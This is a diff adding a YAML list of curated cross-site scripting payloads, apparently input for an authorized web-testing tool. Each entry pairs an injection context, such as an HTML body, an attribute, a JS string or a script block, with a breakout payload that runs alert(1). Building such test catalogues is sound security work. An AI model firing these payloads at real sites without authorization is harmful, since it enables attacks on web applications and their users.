@@ -1,0 +1,179 @@
+# Curated XSS base payloads for authorized web security testing.
+# Each entry:
+#   id:            stable identifier
+#   context:       one of html_body | attr_quoted | attr_unquoted | js_string | script_block
+#   prerequisites: tags / events that must appear in FilterModel.allowed_* for the payload
+#                  to be considered viable. Empty / omitted = no constraint.
+#   template:      the raw payload string
+#   description:   short human note
+
+# --- html_body ---
+- id: html-body-script-basic
+  context: html_body
+  prerequisites:
+    tags: [script]
+  template: "<script>alert(1)</script>"
+  description: Plain <script> block; blocked by most tag filters.
+
+- id: html-body-img-onerror
+  context: html_body
+  prerequisites:
+    tags: [img]
+    events: [onerror]
+  template: "<img src=x onerror=alert(1)>"
+  description: Classic broken-image onerror handler.
+
+- id: html-body-svg-onload
+  context: html_body
+  prerequisites:
+    tags: [svg]
+    events: [onload]
+  template: "<svg onload=alert(1)>"
+  description: SVG root with onload; short and reliable.
+
+- id: html-body-iframe-srcdoc
+  context: html_body
+  prerequisites:
+    tags: [iframe]
+  template: "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
+  description: Embedded script via iframe srcdoc.
+
+- id: html-body-body-onload
+  context: html_body
+  prerequisites:
+    tags: [body]
+    events: [onload]
+  template: "<body onload=alert(1)>"
+  description: Extra <body> element; some parsers still honour its onload.
+
+- id: html-body-details-ontoggle
+  context: html_body
+  prerequisites:
+    tags: [details]
+  template: "<details open ontoggle=alert(1)>"
+  description: No JS click required; ontoggle fires immediately.
+
+- id: html-body-marquee-onstart
+  context: html_body
+  prerequisites:
+    tags: [marquee]
+  template: "<marquee onstart=alert(1)>"
+  description: Legacy marquee element with onstart.
+
+- id: html-body-input-autofocus
+  context: html_body
+  prerequisites:
+    tags: [input]
+    events: [onfocus]
+  template: "<input autofocus onfocus=alert(1)>"
+  description: Auto-focuses and fires onfocus handler.
+
+- id: html-body-video-onerror
+  context: html_body
+  prerequisites:
+    tags: [video]
+    events: [onerror]
+  template: "<video src=x onerror=alert(1)></video>"
+  description: Video element variant of the broken-source trick.
+
+- id: html-body-a-href-js
+  context: html_body
+  prerequisites:
+    tags: [a]
+  template: "<a href=\"javascript:alert(1)\">x</a>"
+  description: "javascript: URI on an anchor; requires user click."
+
+# --- attr_quoted ---
+- id: attr-quoted-double-onfocus
+  context: attr_quoted
+  prerequisites:
+    events: [onfocus]
+  template: "\" onfocus=alert(1) autofocus x=\""
+  description: Break out of a double-quoted attribute, land an onfocus handler.
+
+- id: attr-quoted-single-onfocus
+  context: attr_quoted
+  prerequisites:
+    events: [onfocus]
+  template: "' onfocus=alert(1) autofocus x='"
+  description: Single-quoted variant of the attribute breakout.
+
+- id: attr-quoted-double-onerror
+  context: attr_quoted
+  prerequisites:
+    events: [onerror]
+  template: "\" onerror=alert(1) x=\""
+  description: Double-quote breakout with an onerror handler.
+
+- id: attr-quoted-script-breakout
+  context: attr_quoted
+  prerequisites:
+    tags: [script]
+  template: "\"><script>alert(1)</script>"
+  description: Close attribute, close tag, inject a <script>.
+
+# --- attr_unquoted ---
+- id: attr-unquoted-onmouseover
+  context: attr_unquoted
+  prerequisites:
+    events: [onmouseover]
+  template: " onmouseover=alert(1) "
+  description: Whitespace separator, no quotes needed around the event value.
+
+- id: attr-unquoted-autofocus
+  context: attr_unquoted
+  prerequisites:
+    events: [onfocus]
+  template: " autofocus onfocus=alert(1) "
+  description: Unquoted-attribute variant that triggers on focus.
+
+- id: attr-unquoted-onclick
+  context: attr_unquoted
+  prerequisites:
+    events: [onclick]
+  template: " onclick=alert(1) "
+  description: Requires a click; useful when autofocus is stripped.
+
+# --- js_string ---
+- id: js-string-break-double
+  context: js_string
+  template: "\";alert(1);//"
+  description: Break out of a double-quoted JS string and inject.
+
+- id: js-string-break-single
+  context: js_string
+  template: "';alert(1);//"
+  description: Single-quoted variant.
+
+- id: js-string-template
+  context: js_string
+  template: "`);alert(1);//"
+  description: Template-literal breakout.
+
+- id: js-string-close-script
+  context: js_string
+  prerequisites:
+    tags: [script]
+  template: "</script><script>alert(1)</script>"
+  description: Close current <script>, open a new one with the payload.
+
+- id: js-string-concat
+  context: js_string
+  template: "\"+alert(1)+\""
+  description: String concatenation trick for `"..." + x + "..."` patterns.
+
+# --- script_block ---
+- id: script-block-direct
+  context: script_block
+  template: "alert(1)"
+  description: Raw expression for injections already inside a <script>.
+
+- id: script-block-comment-break
+  context: script_block
+  template: "*/alert(1)/*"
+  description: Escape a block comment surrounding the injection point.
+
+- id: script-block-semicolon
+  context: script_block
+  template: ";alert(1);"
+  description: Terminate previous statement, inject, then let the next one continue.
